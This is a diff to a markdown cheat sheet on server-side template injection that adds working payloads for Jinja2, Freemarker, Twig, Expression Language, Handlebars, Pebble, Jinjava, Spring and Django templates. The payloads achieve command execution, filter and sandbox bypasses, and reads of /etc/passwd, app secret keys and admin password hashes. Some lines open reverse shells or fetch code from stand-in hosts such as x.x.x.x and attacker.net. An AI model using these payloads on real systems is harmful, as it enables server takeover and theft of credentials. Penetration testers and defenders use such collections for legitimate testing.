@@ -1,14 +1,89 @@
 +++
 title = "Server-Side Template Injection"
-date = '2022-10-16'
+date = '2023-06-21'
 description = 'All about server-side template injection techniques, methods, payloads, how/why/when they work.'
 include_toc = 'true'
 +++
-# Server-Side Template Injections
-
-## Note that Hugo still has some difficulty handling certain strings in certain manners here and it's under investigation, but.. for now.. this section is incomplete and Gray Hat Freelancing is aware
+# Server Side Template Injection
 
 > Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages
+
+## Summary
+
+- [Templates Injections](#templates-injections)
+  - [Summary](#summary)
+  - [Tools](#tools)
+  - [Methodology](#methodology)
+  - [ASP.NET Razor](#aspnet-razor)
+    - [ASP.NET Razor - Basic injection](#aspnet-razor---basic-injection)
+    - [ASP.NET Razor - Command execution](#aspnet-razor---command-execution)
+  - [Expression Language EL](#expression-language-el)
+    - [Expression Language EL - Basic injection](#expression-language-el---basic-injection)
+    - [Expression Language EL - One-Liner injections not including code execution](#expression-language-el---one-liner-injections-not-including-code-execution)
+    - [Expression Language EL - Code Execution](#expression-language-el---code-execution)
+  - [Java - Freemarker](#freemarker)
+    - [Freemarker - Basic injection](#freemarker---basic-injection)
+    - [Freemarker - Read File](#freemarker---read-file)
+    - [Freemarker - Code execution](#freemarker---code-execution)
+    - [Freemarker - Sandbox bypass](#freemarker---sandbox-bypass)
+  - [Groovy](#groovy)
+    - [Groovy - Basic injection](#groovy---basic-injection)
+    - [Groovy - Read and create File](#groovy---read-and-create-file)
+    - [Groovy - HTTP request:](#groovy---http-request)
+    - [Groovy - Command Execution](#groovy---command-execution)
+    - [Groovy - Sandbox Bypass](#groovy---sandbox-bypass)
+  - [JavaScript - Handlebars](#handlebars)
+    - [Handlebars - Command Execution](#handlebars---command-execution)
+  - [Jade / Codepen](#jade--codepen)
+  - [Java](#java)
+    - [Java - Basic injection](#java---basic-injection)
+    - [Java - Retrieve the system’s environment variables](#java---retrieve-the-systems-environment-variables)
+    - [Java - Retrieve /etc/passwd](#java---retrieve-etcpasswd)
+  - [Django Templates](#django-templates)
+  - [Python - Jinja2](#jinja2)
+    - [Jinja2 - Basic injection](#jinja2---basic-injection)
+    - [Jinja2 - Template format](#jinja2---template-format)
+    - [Jinja2 - Debug Statement](#jinja2---debug-statement)
+    - [Jinja2 - Dump all used classes](#jinja2---dump-all-used-classes)
+    - [Jinja2 - Dump all config variables](#jinja2---dump-all-config-variables)
+    - [Jinja2 - Read remote file](#jinja2---read-remote-file)
+    - [Jinja2 - Write into remote file](#jinja2---write-into-remote-file)
+    - [Jinja2 - Remote Code Execution](#jinja2---remote-code-execution)
+      - [Forcing output on blind RCE](#jinja2---forcing-output-on-blind-rce)
+      - [Exploit the SSTI by calling os.popen().read()](#exploit-the-ssti-by-calling-ospopenread)
+      - [Exploit the SSTI by calling subprocess.Popen](#exploit-the-ssti-by-calling-subprocesspopen)
+      - [Exploit the SSTI by calling Popen without guessing the offset](#exploit-the-ssti-by-calling-popen-without-guessing-the-offset)
+      - [Exploit the SSTI by writing an evil config file.](#exploit-the-ssti-by-writing-an-evil-config-file)
+    - [Jinja2 - Filter bypass](#jinja2---filter-bypass)
+  - [Java - Jinjava](#jinjava)
+    - [Jinjava - Basic injection](#jinjava---basic-injection)
+    - [Jinjava - Command execution](#jinjava---command-execution)
+  - [JavaScript - Lessjs](#lessjs)
+    - [Lessjs - SSRF / LFI](#lessjs---ssrf--lfi)
+    - [Lessjs < v3 - Command Execution](#lessjs--v3---command-execution)
+    - [Plugins](#plugins)
+  - [Python - Mako](#mako)
+    - [Direct access to os from TemplateNamespace:](#direct-access-to-os-from-templatenamespace)
+  - [Java - Pebble](#pebble)
+    - [Pebble - Basic injection](#pebble---basic-injection)
+    - [Pebble - Code execution](#pebble---code-execution)
+  - [Ruby](#ruby)
+    - [Ruby - Basic injections](#ruby---basic-injections)
+    - [Ruby - Retrieve /etc/passwd](#ruby---retrieve-etcpasswd)
+    - [Ruby - List files and directories](#ruby---list-files-and-directories)
+    - [Ruby - Code execution](#ruby---code-execution)
+  - [PHP - Smarty](#smarty)
+  - [PHP - Twig](#twig)
+    - [Twig - Basic injection](#twig---basic-injection)
+    - [Twig - Template format](#twig---template-format)
+    - [Twig - Arbitrary File Reading](#twig---arbitrary-file-reading)
+    - [Twig - Code execution](#twig---code-execution)
+  - [Java - Velocity](#java---velocity)
+  - [Java - Spring](#java---spring)
+  - [PHP - patTemplate](#pattemplate)
+  - [PHP - PHPlib](#phplib-and-html_template_phplib)
+  - [PHP - Plates](#plates)
+  - [References](#references)
 
 ## Tools
 
@@ -18,7 +93,7 @@ Recommended tools:
 
 e.g:
 
-```bash
+```powershell
 python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell
 python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"
 python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
@@ -28,7 +103,7 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment
 
 e.g:
 
-```bash
+```powershell
 python3 ./sstimap.py -u 'https://example.com/page?name=John' -s
 python3 ./sstimap.py -u 'https://example.com/page?name=Vulnerable*&message=My_message' -l 5 -e jade
 python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV0X3Bhc3N3b3Jk'
@@ -43,7 +118,9 @@ python3 ./sstimap.py -i -A -m POST -l 5 -H 'Authorization: Basic bG9naW46c2VjcmV
 
 In most cases, this polyglot payload will trigger an error in presence of a SSTI vulnerability :
 
-### NEED BUGFIX FOR THIS POLYGLOT
+```
+${{<%[%'"}}%\.
+```
 
 ## ASP.NET Razor
 
@@ -74,8 +151,23 @@ In most cases, this polyglot payload will trigger an error in presence of a SSTI
 ### Expression Language EL - Basic injection
 
 ```java
+${<property>}
 ${1+1}
+
+#{<expression string>}
 #{1+1}
+
+T(<javaclass>)
+```
+
+### Expression Language EL - Properties
+
+* Interesting properties to access `String`, `java.lang.Runtime`
+
+```ps1
+${2.class}
+${2.class.forName("java.lang.String")}
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].toString()}
 ```
 
 ### Expression Language EL - One-Liner injections not including code execution
@@ -86,6 +178,9 @@ ${"".getClass().forName("java.net.InetAddress").getMethod("getByName","".getClas
 
 // JVM System Property Lookup (ex: java.class.path)
 ${"".getClass().forName("java.lang.System").getDeclaredMethod("getProperty","".getClass()).invoke("","java.class.path")}
+
+// Modify session attributes
+${pageContext.request.getSession().setAttribute("admin",true)}
 ```
 
 ### Expression Language EL - Code Execution
@@ -110,9 +205,13 @@ ${request.getAttribute("a")}
 
 // Method using Reflection & Invoke
 ${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("calc.exe")}
+${''.getClass().forName('java.lang.Runtime').getMethods()[6].invoke(''.getClass().forName('java.lang.Runtime')).exec('whoami')}
 
 // Method using ScriptEngineManager one-liner
 ${request.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec(\\\"ping x.x.x.x\\\")"))}
+
+// Method using JavaClass
+T(java.lang.Runtime).getRuntime().exec('whoami').x
 
 // Method using ScriptEngineManager
 ${facesContext.getExternalContext().setResponseHeader("output","".getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("JavaScript").eval(\"var x=new java.lang.ProcessBuilder;x.command(\\\"wget\\\",\\\"http://x.x.x.x/1.sh\\\");org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\"))}
@@ -129,7 +228,11 @@ You can try your payloads at [https://try.freemarker.apache.org](https://try.fre
 
 ### Freemarker - Basic injection
 
-The template can be `${3*3}` or the legacy `#{3*3}`.
+The template can be :
+
+* Default: `${3*3}`  
+* Legacy: `#{3*3}`
+* Alternative: `[=3*3]` since [FreeMarker 2.3.4](https://freemarker.apache.org/docs/dgui_misc_alternativesyntax.html)
 
 ### Freemarker - Read File
 
@@ -144,13 +247,15 @@ Convert the returned bytes to ASCII
 <#assign ex = "freemarker.template.utility.Execute"?new()>${ ex("id")}
 [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
 ${"freemarker.template.utility.Execute"?new()("id")}
+#{"freemarker.template.utility.Execute"?new()("id")}
+[="freemarker.template.utility.Execute"?new()("id")]
 ```
 
 ### Freemarker - Sandbox bypass
 
 :warning: only works on Freemarker versions below 2.3.30
 
-```javascript
+```js
 <#assign classloader=article.class.protectionDomain.classLoader>
 <#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")>
 <#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)>
@@ -212,7 +317,29 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 [Official website](https://handlebarsjs.com/)
 > Handlebars compiles templates into JavaScript functions.
 
-### NEED BUGFIX FOR HANDLEBARS
+### Handlebars - Command Execution
+
+```handlebars
+{{#with "s" as |string|}}
+  {{#with "e"}}
+    {{#with split as |conslist|}}
+      {{this.pop}}
+      {{this.push (lookup string.sub "constructor")}}
+      {{this.pop}}
+      {{#with string.split as |codelist|}}
+        {{this.pop}}
+        {{this.push "return require('child_process').execSync('ls -la');"}}
+        {{this.pop}}
+        {{#each conslist}}
+          {{#with (string.sub.apply 0 codelist)}}
+            {{this}}
+          {{/with}}
+        {{/each}}
+      {{/with}}
+    {{/with}}
+  {{/with}}
+{{/with}}
+```
 
 ---
 
@@ -241,11 +368,11 @@ ${ new groovy.lang.GroovyClassLoader().parseClass("@groovy.transform.ASTTest(val
 
 ```java
 ${7*7}
+${{7*7}}
 ${class.getClassLoader()}
 ${class.getResource("").getPath()}
 ${class.getResource("../../../../../index.htm").getContent()}
 ```
-### NEED BUGFIX FOR SOME JAVA
 
 ### Java - Retrieve the system’s environment variables
 
@@ -256,7 +383,7 @@ ${T(java.lang.System).getenv()}
 ### Java - Retrieve /etc/passwd
 
 ```java
-${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}
+${T(java.lang.Runtime).getRuntime().exec('cat /etc/passwd')}
 
 ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(99).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(32)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(101)).concat(T(java.lang.Character).toString(116)).concat(T(java.lang.Character).toString(99)).concat(T(java.lang.Character).toString(47)).concat(T(java.lang.Character).toString(112)).concat(T(java.lang.Character).toString(97)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(115)).concat(T(java.lang.Character).toString(119)).concat(T(java.lang.Character).toString(100))).getInputStream())}
 ```
@@ -267,14 +394,271 @@ ${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().ex
 
 Django template language supports 2 rendering engines by default: Django Templates (DT) and Jinja2. Django Templates is much simpler engine. It does not allow calling of passed object functions and impact of SSTI in DT is often less severe than in Jinja2.
 
-### NEED BUGFIX FOR DJANGO
+### Detection
+
+
+```python
+{% csrf_token %} # Causes error with Jinja2
+{{ 7*7 }}  # Error with Django Templates
+ih0vr{{364|add:733}}d121r # Burp Payload -> ih0vr1097d121r
+```
+
+### Django Templates for post-exploitation
+
+```python
+# Variables
+{{ variable }}
+{{ variable.attr }}
+
+# Filters
+{{ value|length }}
+
+# Tags
+{% csrf_token %}
+```
+
+### Cross-site scripting
+
+```python
+{{ '<script>alert(3)</script>' }}
+{{ '<script>alert(3)</script>' | safe }}
+```
+
+### Debug information leak
+
+```python
+{% debug %}
+```
+
+### Leaking app’s Secret Key
+
+```python
+{{ messages.storages.0.signer.key }}
+```
+
+### Admin Site URL leak
+
+
+```
+{% include 'admin/base.html' %}
+```
+
+### Admin username and password hash leak
+
+
+```
+{% load log %}{% get_admin_log 10 as log %}{% for e in log %}
+{{e.user.get_username}} : {{e.user.password}}{% endfor %}
+```
 
 ## Jinja2
 
 [Official website](https://jinja.palletsprojects.com/)
 > Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.  
 
-### NEED BUGFIX FOR JINJA2
+### Jinja2 - Basic injection
+
+```python
+{{4*4}}[[5*5]]
+{{7*'7'}} would result in 7777777
+{{config.items()}}
+```
+
+Jinja2 is used by Python Web Frameworks such as Django or Flask.
+The above injections have been tested on a Flask application.
+
+### Jinja2 - Template format
+
+```python
+{% extends "layout.html" %}
+{% block body %}
+  <ul>
+  {% for user in users %}
+    <li><a href="{{ user.url }}">{{ user.username }}</a></li>
+  {% endfor %}
+  </ul>
+{% endblock %}
+
+```
+
+### Jinja2 - Debug Statement
+
+If the Debug Extension is enabled, a `{% debug %}` tag will be available to dump the current context as well as the available filters and tests. This is useful to see what’s available to use in the template without setting up a debugger.
+
+```python
+<pre>{% debug %}</pre>
+```
+
+Source: https://jinja.palletsprojects.com/en/2.11.x/templates/#debug-statement
+
+### Jinja2 - Dump all used classes
+
+```python
+{{ [].class.base.subclasses() }}
+{{''.class.mro()[1].subclasses()}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+```
+
+Access `__globals__` and `__builtins__`:
+
+```python
+{{ self.__init__.__globals__.__builtins__ }}
+```
+
+### Jinja2 - Dump all config variables
+
+```python
+{% for key, value in config.iteritems() %}
+    <dt>{{ key|e }}</dt>
+    <dd>{{ value|e }}</dd>
+{% endfor %}
+```
+
+### Jinja2 - Read remote file
+
+```python
+# ''.__class__.__mro__[2].__subclasses__()[40] = File class
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
+{{ config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]("/tmp/flag").read() }}
+# https://github.com/pallets/flask/blob/master/src/flask/helpers.py#L398
+{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
+```
+
+### Jinja2 - Write into remote file
+
+```python
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/var/www/html/myflaskapp/hello.txt', 'w').write('Hello here !') }}
+```
+
+### Jinja2 - Remote Code Execution
+
+Listen for connection
+
+```bash
+nc -lnvp 8000
+```
+
+#### Jinja2 - Forcing output on blind RCE
+
+You can import Flask functions to return an output from the vulnerable page.
+
+```py
+{{
+x.__init__.__builtins__.exec("from flask import current_app, after_this_request
+@after_this_request
+def hook(*args, **kwargs):
+    from flask import make_response
+    r = make_response('Powned')
+    return r
+")
+}}
+```
+
+
+#### Exploit the SSTI by calling os.popen().read()
+
+```python
+{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+```
+
+But when `__builtins__` is filtered, the following payloads are context-free, and do not require anything, except being in a jinja2 Template object:
+
+```python
+{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
+```
+
+We can use these shorter payloads:
+
+```python
+{{ cycler.__init__.__globals__.os.popen('id').read() }}
+{{ joiner.__init__.__globals__.os.popen('id').read() }}
+{{ namespace.__init__.__globals__.os.popen('id').read() }}
+```
+
+Source [@podalirius_](https://twitter.com/podalirius_) : https://podalirius.net/en/articles/python-vulnerabilities-code-execution-in-jinja-templates/
+
+With [objectwalker](https://github.com/p0dalirius/objectwalker) we can find a path to the `os` module from `lipsum`. This is the shortest payload known to achieve RCE in a Jinja2 template:
+
+```python
+{{ lipsum.__globals__["os"].popen('id').read() }}
+```
+
+Source: https://twitter.com/podalirius_/status/1655970628648697860
+
+#### Exploit the SSTI by calling subprocess.Popen
+
+:warning: the number 396 will vary depending of the application.
+
+```python
+{{''.__class__.mro()[1].__subclasses__()[396]('cat flag.txt',shell=True,stdout=-1).communicate()[0].strip()}}
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+```
+
+#### Exploit the SSTI by calling Popen without guessing the offset
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
+```
+
+Simply modification of payload to clean up output and facilitate command input (https://twitter.com/SecGus/status/1198976764351066113)
+In another GET parameter include a variable named "input" that contains the command you want to run (For example: &input=ls)
+
+```python
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
+```
+
+#### Exploit the SSTI by writing an evil config file.
+
+```python
+# evil config
+{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}
+
+# load the evil config
+{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  
+
+# connect to evil host
+{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/8000 0>&1"',shell=True) }}
+```
+
+### Jinja2 - Filter bypass
+
+```python
+request.__class__
+request["__class__"]
+```
+
+Bypassing `_`
+
+```python
+http://localhost:5000/?exploit={{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}&class=class&usc=_
+
+{{request|attr([request.args.usc*2,request.args.class,request.args.usc*2]|join)}}
+{{request|attr(["_"*2,"class","_"*2]|join)}}
+{{request|attr(["__","class","__"]|join)}}
+{{request|attr("__class__")}}
+{{request.__class__}}
+```
+
+Bypassing `[` and `]`
+
+```python
+http://localhost:5000/?exploit={{request|attr((request.args.usc*2,request.args.class,request.args.usc*2)|join)}}&class=class&usc=_
+or
+http://localhost:5000/?exploit={{request|attr(request.args.getlist(request.args.l)|join)}}&l=a&a=_&a=_&a=class&a=_&a=_
+```
+
+Bypassing `|join`
+
+```python
+http://localhost:5000/?exploit={{request|attr(request.args.f|format(request.args.a,request.args.a,request.args.a,request.args.a))}}&f=%s%sclass%s%s&a=_
+```
+
+Bypassing most common filters ('.','_','|join','[',']','mro' and 'base') by https://twitter.com/SecGus:
+```python
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
+```
 
 ---
 
@@ -283,7 +667,28 @@ Django template language supports 2 rendering engines by default: Django Templat
 [Official website](https://github.com/HubSpot/jinjava)
 > Java-based template engine based on django template syntax, adapted to render jinja templates (at least the subset of jinja in use in HubSpot content).
 
-### NEED BUGFIX FOR JINJAVA
+### Jinjava - Basic injection
+
+```python
+{{'a'.toUpperCase()}} would result in 'A'
+{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
+```
+
+Jinjava is an open source project developed by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
+
+### Jinjava - Command execution
+
+Fixed by https://github.com/HubSpot/jinjava/pull/230
+
+```python
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
+
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
+
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+```
 
 ---
 
@@ -435,7 +840,32 @@ Source [@podalirius_](https://twitter.com/podalirius_) : [https://podalirius.net
 [Official website](https://pebbletemplates.io/)
 > Pebble is a Java templating engine inspired by [Twig](./#twig) and similar to the Python [Jinja](./#jinja2) Template Engine syntax. It features templates inheritance and easy-to-read syntax, ships with built-in autoescaping for security, and includes integrated support for internationalization.
 
-### NEED BUGFIX FOR PEBBLE
+### Pebble - Basic injection
+
+```java
+{{ someString.toUPPERCASE() }}
+```
+
+### Pebble - Code execution
+
+Old version of Pebble ( < version 3.0.9): `{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}`.
+
+New version of Pebble :
+
+```java
+{% set cmd = 'id' %}
+{% set bytes = (1).TYPE
+     .forName('java.lang.Runtime')
+     .methods[6]
+     .invoke(null,null)
+     .exec(cmd)
+     .inputStream
+     .readAllBytes() %}
+{{ (1).TYPE
+     .forName('java.lang.String')
+     .constructors[0]
+     .newInstance(([bytes]).toArray()) }}
+```
 
 ---
 
@@ -481,7 +911,7 @@ Execute code using SSTI for ERB engine.
 
 Execute code using SSTI for Slim engine.
 
-```ruby
+```powershell
 #{ %x|env| }
 ```
 
@@ -509,7 +939,13 @@ Execute code using SSTI for Slim engine.
 
 ### Twig - Basic injection
 
-### NEED BUGFIX FOR TWIG
+```python
+{{7*7}}
+{{7*'7'}} would result in 49
+{{dump(app)}}
+{{dump(_context)}}
+{{app.request.server.all|join(',')}}
+```
 
 ### Twig - Template format
 
@@ -524,9 +960,46 @@ $output = $twig > render (
   array("first_name" => $user.first_name)
 );
 ```
+
+### Twig - Arbitrary File Reading
+
+```python
+"{{'/etc/passwd'|file_excerpt(1,30)}}"@
+{{include("wp-config.php")}}
+```
+
+### Twig - Code execution
+
+```python
+{{self}}
+{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{[0]|reduce('system','id')}}
+{{['id']|map('system')|join}}
+{{['id',1]|sort('system')|join}}
+{{['cat\x20/etc/passwd']|filter('system')}}
+{{['cat$IFS/etc/passwd']|filter('system')}}
+{{['id']|filter('passthru')}}
+{{['id']|map('passthru')}}
+```
+
+Example injecting values to avoid using quotes for the filename (specify via OFFSET and LENGTH where the payload FILENAME is)
+
+```python
+FILENAME{% set var = dump(_context)[OFFSET:LENGTH] %} {{ include(var) }}
+```
+
+Example with an email passing FILTER_VALIDATE_EMAIL PHP.
+
+```powershell
+POST /subscribe?0=cat+/etc/passwd HTTP/1.1
+email="{{app.request.query.filter(0,0,1024,{'options':'system'})}}"@attacker.tld
+```
+
 ---
 
-## Velocity
+## Java - Velocity
 
 [Official website](https://velocity.apache.org/engine/1.7/user-guide.html)
 > Velocity is a Java-based template engine. It permits web page designers to reference methods defined in Java code.
@@ -540,6 +1013,16 @@ $ex.waitFor()
 #foreach($i in [1..$out.available()])
 $str.valueOf($chr.toChars($out.read()))
 #end
+```
+
+---
+
+
+## Java - Spring
+
+```python
+*{7*7}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
 ```
 
 ---
@@ -667,13 +1150,11 @@ layout template:
 ## References
 
 * [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
-* [Yahoo! RCE via Spring Engine SSTI](https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/)
 * [Ruby ERB Template injection - TrustedSec](https://www.trustedsec.com/2017/09/rubyerb-template-injection/)
 * [Gist - Server-Side Template Injection - RCE For the Modern WebApp by James Kettle (PortSwigger)](https://gist.github.com/Yas3r/7006ec36ffb987cbfb98)
 * [PDF - Server-Side Template Injection: RCE for the modern webapp - @albinowax](https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf)
-* [VelocityServlet Expression Language injection](https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/)
+* [VelocityServlet Expression Language injection](https://magicbluech.github.io/2017/11/15/VelocityServlet-Expression-language-Injection/)
 * [Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 • By phosphore](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
-* [RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug](https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad)
 * [RCE in Hubspot with EL injection in HubL - @fyoorer](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw)
 * [Jinja2 template injection filter bypasses - @gehaxelt, @0daywork](https://0day.work/jinja2-template-injection-filter-bypasses/)
 * [Gaining Shell using Server Side Template Injection (SSTI) - David Valles - Aug 22, 2018](https://medium.com/@david.valles/gaining-shell-using-server-side-template-injection-ssti-81e29bb8e0f9)
@@ -688,3 +1169,7 @@ layout template:
 * [Exploiting Less.js to Achieve RCE](https://www.softwaresecured.com/exploiting-less-js/)
 * [A Pentester's Guide to Server Side Template Injection (SSTI)](https://www.cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti)
 * [Django Templates Server-Side Template Injection](https://lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf)
+* [#HITB2022SIN #LAB Template Injection On Hardened Targets - Lucas 'BitK' Philippe](https://youtu.be/M0b_KA0OMFw)
+* [Bug Writeup: RCE via SSTI on Spring Boot Error Page with Akamai WAF Bypass - Dec 4, 2022](https://h1pmnh.github.io/post/writeup_spring_el_waf_bypass/)
+* [Leveraging the Spring Expression Language (SpEL) injection vulnerability ( a.k.a The Magic SpEL) to get RCE - Xenofon Vassilakopoulos - November 18, 2021](https://xen0vas.github.io/Leveraging-the-SpEL-Injection-Vulnerability-to-get-RCE/)
+* [Expression Language Injection - OWASP](https://owasp.org/www-community/vulnerabilities/Expression_Language_Injection)
